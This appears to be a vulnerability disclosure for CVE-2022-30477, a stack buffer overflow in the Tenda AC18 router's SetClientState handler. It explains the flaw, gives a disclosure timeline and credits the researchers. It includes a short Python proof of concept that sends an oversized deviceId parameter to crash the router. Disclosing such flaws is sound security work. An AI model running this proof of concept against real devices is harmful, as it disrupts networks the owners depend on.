# Tenda Router AC18 Vulnerability

This vulnerability lies in the `/goform/SetClientState` page which influences the lastest version of Tenda Router AC18. (The latest version is [AC18_V15.03.05.19(6318)](https://www.tenda.com.cn/download/detail-2683.html))

## Vulnerability Description

There is a **stack-based buffer overflow** vulnerability in function `formSetClientState`.

In function `formSetClientState` it reads user provided parameter `deviceId` into `v9`, and this variable is passed into function `sprintf` without any length check, which may overflow the stack-based buffer `s`.

![Vulnerability Function](./vuln.png)

So by requesting the page `/goform/SetClientState`, the attacker can easily perform a **Deny of Service Attack** or **Remote Code Execution** with carefully crafted overflow data.

## PoC

```python
import requests

IP = "10.10.10.1"
url = f"http://{IP}/goform/SetClientState?"
url += "limitEn=1&deviceId=" + "s" * 0x500

response = requests.get(url)
```

## Timeline

* 2022-05-07: Report to CVE & CNVD;
* 2022-05-26: CVE ID assigned (CVE-2022-30477)

## Acknowledge

Credit to [@peanuts](https://github.com/peanuts62) and [@cylin](https://github.com/lcyfrank) from IIE, CAS.
